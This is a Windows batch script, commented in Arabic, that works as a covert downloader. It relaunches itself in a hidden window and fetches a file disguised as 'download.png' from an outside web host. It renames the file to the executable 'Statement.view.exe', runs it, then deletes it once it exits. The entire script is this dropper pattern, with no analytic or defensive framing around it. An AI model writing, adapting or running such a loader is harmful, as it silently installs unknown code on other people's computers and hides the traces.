@echo off
:: التحقق إذا كان السكريبت يعمل بشكل مخفي أم لا
if not "%1"=="hide" (
    :: إعادة تشغيل السكريبت بشكل مخفي
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hide' -WindowStyle Hidden"
    exit /b
)

:: من هنا يبدأ الكود الأصلي (يعمل في الخلفية)
setlocal

set "INSTALL_PATH=C:\instax"
set "FILE_NAME=Statement.view.exe"
set "DOWNLOAD_URL=http://ostazna.com/test/download.png"

echo [%date% %time%] بدء التثبيت > "%INSTALL_PATH%\install_log.txt" 2>nul

if not exist "%INSTALL_PATH%" (
    mkdir "%INSTALL_PATH%" 2>nul
    echo [%date% %time%] تم إنشاء المجلد %INSTALL_PATH% >> "%INSTALL_PATH%\install_log.txt" 2>nul
)

cd /d "%INSTALL_PATH%" 2>nul

echo [%date% %time%] جاري تحميل الملف... >> "%INSTALL_PATH%\install_log.txt" 2>nul
powershell -command "& {Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile 'download.png'}" 2>nul

if not exist "download.png" (
    echo [%date% %time%] خطأ: فشل تحميل الملف >> "%INSTALL_PATH%\install_log.txt" 2>nul
    exit /b 1
)

echo [%date% %time%] جاري إعادة تسمية الملف... >> "%INSTALL_PATH%\install_log.txt" 2>nul
rename download.png "%FILE_NAME%" 2>nul

if not exist "%FILE_NAME%" (
    echo [%date% %time%] خطأ: فشل إعادة تسمية الملف >> "%INSTALL_PATH%\install_log.txt" 2>nul
    exit /b 1
)

echo [%date% %time%] جاري تشغيل الملف... >> "%INSTALL_PATH%\install_log.txt" 2>nul
start "" "%FILE_NAME%"

echo [%date% %time%] جاري الانتظار حتى انتهاء عملية التثبيت... >> "%INSTALL_PATH%\install_log.txt" 2>nul

:waitloop
timeout /t 2 /nobreak >nul 2>nul
tasklist /fi "imagename eq %FILE_NAME%" 2>nul | find /i "%FILE_NAME%" >nul 2>nul
if not errorlevel 1 goto waitloop

echo [%date% %time%] تم انتهاء عملية التثبيت، جاري حذف الملف... >> "%INSTALL_PATH%\install_log.txt" 2>nul
del "%FILE_NAME%" 2>nul

if exist "%FILE_NAME%" (
    echo [%date% %time%] تحذير: لم يتم حذف الملف قد يكون قيد الاستخدام >> "%INSTALL_PATH%\install_log.txt" 2>nul
) else (
    echo [%date% %time%] تم حذف الملف بنجاح >> "%INSTALL_PATH%\install_log.txt" 2>nul
)

echo [%date% %time%] اكتملت العملية بنجاح >> "%INSTALL_PATH%\install_log.txt" 2>nul
endlocal
exit /b 0